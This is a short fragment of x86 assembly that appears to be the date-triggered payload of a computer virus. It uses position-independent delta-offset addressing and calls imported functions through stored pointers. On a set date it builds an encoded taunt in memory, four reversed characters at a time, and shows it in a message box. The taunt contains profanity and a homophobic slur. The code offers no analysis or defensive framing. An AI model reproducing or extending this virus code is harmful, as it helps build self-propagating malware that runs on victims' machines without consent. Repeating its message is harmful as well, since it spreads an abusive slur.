payload__:  ;dnt bther seeing it!
jmp pcode
datestring dd 0
dateformat db "d M y",0

pcode:

push 512
push [ebp+offset buffer]  ;using the same buffer 
mov eax,offset dateformat
add eax,ebp
push eax
push 0
push 0


push 0
call [ebp+offset AGetDateFormatF]

mov edx,[ebp+offset buffer]
cmp byte ptr [edx],'9'
je pay__
ret
pay__:
cmp byte ptr [edx+2],'4'
je continue__p
ret
continue__p:
mov eax,[ebp+offset buffer]
mov dword ptr [eax],'gnoc'
mov dword ptr [eax+4],'star'
mov word ptr [eax+8],'u!'
mov word ptr [eax+10],'h '
mov dword ptr [eax+12],' eva'
mov dword ptr [eax+16],'neeb'
mov dword ptr [eax+20],'cuf '
mov word ptr [eax+24],'ek'
mov word ptr [eax+26],'!d'
mov dword ptr [eax+28],'a yb'
mov dword ptr [eax+32],'gaf '


mov eax,offset s_g 
add eax,ebp
push 0
push eax
mov eax,[ebp+offset buffer]
push eax
push 0
call [ebp+offset MessageBoxAd]

push 5000
call dword ptr [ebp+offset ASleepF]


ret
